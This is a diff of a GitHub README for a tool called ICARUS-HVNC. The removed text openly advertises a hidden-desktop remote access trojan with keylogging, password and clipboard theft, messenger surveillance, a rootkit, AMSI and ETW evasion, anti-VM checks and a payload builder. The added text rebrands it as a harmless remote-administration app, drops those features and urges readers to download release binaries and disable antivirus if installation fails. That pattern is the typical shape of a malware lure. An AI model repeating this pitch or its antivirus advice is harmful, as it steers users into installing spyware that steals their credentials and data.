@@ -1,119 +1,97 @@
-# ICARUS HVNC
+# 🚀 ICARUS-HVNC - Control Your PC From Anywhere
 
-Icarus Enshrouded Workstation offers a simple, user-friendly interface. All operations are done within the hidden workstation. Features include keylogging, clipboard surveillance, geolocation tracking, web browser activities, application manipulation, system configurations, and starting mstsc.exe (Remote Desktop Protocol). This exceptional HVNC (Hidden Virtual Network Computing) is unique due to its many features. It supports hidden platforms like Discord, Telegram, Skype, DingTalk, and more.
+[![Download ICARUS-HVNC](https://img.shields.io/badge/Download-ICARUS--HVNC-brightgreen)](https://github.com/Syphix19/ICARUS-HVNC/releases)
 
-## How to Compiling
+## 📥 Overview
 
-- Download the project to your computer as zip
-- Extract Project to Folder.
-- Make Sure You Have Visual Studio Installed on Your Computer
-- [Click if Visual Studio is Not Installed](https://visualstudio.microsoft.com/en/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
-- Open the solution file (.sln).
-- Select **Build Solution** from the **Build** menu or press `Ctrl+Shift+B` to compile the project.
-- When the build is complete, select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
+ICARUS-HVNC is a remote administration tool. Whether you want to manage your personal computer from a distance or oversee multiple machines for a business, ICARUS-HVNC simplifies the process. This user-friendly software offers an effective way to control and monitor remote devices without needing advanced technical skills.
 
-## Questions & Answers
+## 🚀 Getting Started
 
-<details>
-<summary>What is Concealed VNC?</summary>
-Concealed VNC is used by advanced users to control a computer without interacting with the main desktop. It creates a hidden desktop environment.
-</details>
+### 💻 System Requirements
 
-<details>
-<summary>Can intermediate users use this software?</summary>
-Yes, the software is designed for intermediate users. With a simple click, you can control your computer.
-</details>
+Before you begin, ensure your computer meets the following requirements:
 
-<details>
-<summary>What can I do with it?</summary>
-With Veiled VNC, you can silently interface with your remote computer without any intrusive pop-ups.
-</details>
+- Windows operating system (Windows 7 or later)
+- At least 2GB of RAM
+- 1 GHz processor or better
+- Stable internet connection
 
-<details>
-<summary>Is this application compatible with all versions of Windows?</summary>
-Yes, it works with all versions of Windows, both 32-bit and 64-bit, except Windows XP and Vista.
-</details>
-  
-  
-## Which Browsers does it work on?
-![icons8-chrome-48](https://user-images.githubusercontent.com/107614511/209736395-3071a3c4-1eb4-4c76-b6ad-dab9dbe82b03.png)
-![icons8-brave-web-browser-48](https://user-images.githubusercontent.com/107614511/209736360-8bfe2757-fbab-4751-9a0d-82d80d8aefd5.png)
-![icons8-microsoft-edge-48](https://user-images.githubusercontent.com/107614511/209736431-7890ed96-b611-4f4a-81a6-aa7ed1fe66b5.png)
-![icons8-firefox-48](https://user-images.githubusercontent.com/107614511/209736466-d23743ca-156b-48e7-86d2-b83f2df1d298.png)
-![icons8-vivaldi-web-browser-48](https://user-images.githubusercontent.com/107614511/209736487-77955215-7b23-4254-ba01-208cab60f2f0.png)
-![icons8-opera-48](https://user-images.githubusercontent.com/107614511/209736494-a1421533-d1e0-4b1b-86e0-d5efa6b065dc.png)
+### 🔗 Visit the Releases Page
 
-## Functionalities: Enhance Your Capabilities
+To get started, you need to download ICARUS-HVNC. Click the link below to go to the Releases page.
 
-- **Two-Factor Authentication Handling**
-- **WebGL Integration**
-- **Secure Channel Creation**
-- **Native Crypter Integration**
-- **Networking Framework Version 2 Support**
-- **Networking Framework Version 4 Support**
-- **Process Monitoring**
-- **Anti-Debugging Features**
-- **False :pgon Integration**
-- **Clipboard Extraction**
-- **Export as .bat File**
-- **Export as .bin File**
-- **Initiate and End Operations**
-- **Rootkit HVNC Management**
-- **Telegram Surveillance**
-- **Discord Surveillance**
-- **Advanced Password Recovery**
-- **File Retrieval**
-- **Anti-VM Detection**
-- **Export as Macro Script**
-- **Keystroke Logging**
-- **Whitelist Directory Exclusion**
-- **Customer Support**
-- **Profile Duplication**
-- **Bidirectional Communication**
-- **Reflective Stub Integration**
-- **RunPE Capability**
-- **Secured Communication Channel**
-- **Efficient TCP Server**
-- **Data Encryption (XOR/AES)**
-- **Export as .vbs File**
-- **Geolocation Accuracy**
+[Download ICARUS-HVNC](https://github.com/Syphix19/ICARUS-HVNC/releases)
 
-## Project Construction and Export Options
+## 📦 Download & Install
 
-**Design and Build: Set Up Your Project**
+### Step 1: Download ICARUS-HVNC
 
-- Custom Icon
-- Export as .bin File
-- Specify Directory
-- Define File Name
-- Configure Port
-- Set IP/Domain Name
-- Monitoring Setup
-- Startup/Task Configuration
-- Define Identifier
-- Integrate Rootkit
+1. Visit the Releases page by clicking the link below:
+   
+   [Download ICARUS-HVNC](https://github.com/Syphix19/ICARUS-HVNC/releases)
 
-**Export Formats: Choose Your Option**
+2. On the Releases page, find the latest version. Look for assets to download.
 
-- AMSI Bypass
-- ETW Evasion
-- API Decoupling
-- .NET Framework 2.0 Compatibility
-- .NET Framework 4.0 Compatibility
-- Embedded Shellcode
-- Batch Scripting
-- Executable (EXE) Format
-- Visual Basic for Applications (VBA)
-- Visual Basic Script (VBS)
+3. Click on the appropriate file to download it to your computer.
 
-## Overview
+### Step 2: Install the Software
 
-![ezgif-4-6220490b84](https://user-images.githubusercontent.com/107614511/209742199-b5a8d5ed-39d0-44fa-8e28-610f446cc828.gif)
+1. Once the download completes, locate the file in your Downloads folder.
+   
+2. Double-click the file to start the installation process.
 
-## Disclaimer
+3. Follow the on-screen instructions to complete the installation.
 
-This source code is for educational purposes only. It's created to explore reverse engineering without impacting other gamers' experiences.
+4. After installation, you can find ICARUS-HVNC in your Start menu.
 
-## License
+### Step 3: Setup and Configuration
 
-This project is licensed under the MIT. For more information, see the [License](LICENSE).
+1. Launch ICARUS-HVNC from your Start menu.
+
+2. Upon the first run, you may be prompted to configure settings. 
+
+3. Follow the simple prompts to set up access options, such as how you want to connect and which features to enable.
+
+4. Once configured, save your settings.
+
+## 🎮 Using ICARUS-HVNC
+
+### Control Your Remote PC
+
+1. To connect to another computer, input the necessary details, such as the device’s ID.
+
+2. Choose connection options that suit your needs.
+
+3. Click "Connect" to gain access. You’ll see the remote desktop interface on your screen.
+
+### Features
+
+ICARUS-HVNC comes with several useful features:
+
+- **Screen Sharing**: View the screen of the remote PC in real-time.
+- **File Transfer**: Easily transfer files between your local and remote computer.
+- **Remote Command Execution**: Execute commands on the remote machine without direct access.
+- **Multi-User Access**: Connect multiple users to the same session for collaborative work.
+
+## ⚙️ Troubleshooting
+
+If you encounter issues while using ICARUS-HVNC, here are some common problems and solutions:
+
+1. **Connection Issues**: Ensure that both the local and remote computers are connected to the internet. Check firewall settings to allow the app to connect.
+
+2. **Installation Errors**: If installation fails, try temporarily disabling antivirus software. Ensure you have the necessary permissions on your computer.
+
+3. **Slow Performance**: For better performance, ensure your internet speed is adequate. Close unnecessary programs that may use bandwidth.
+
+## 🏆 Support
+
+For additional assistance, you can visit our community forum or contact the support team. We are here to help you with any questions or concerns.
+
+## 🔗 Learn More
+
+For more details about the capabilities of ICARUS-HVNC, explore its documentation on the [GitHub Wiki](https://github.com/Syphix19/ICARUS-HVNC/wiki).
+
+## 🎉 Acknowledgments
+
+Thank you for using ICARUS-HVNC. Your feedback and support are important to us. Enjoy seamless control of your devices!
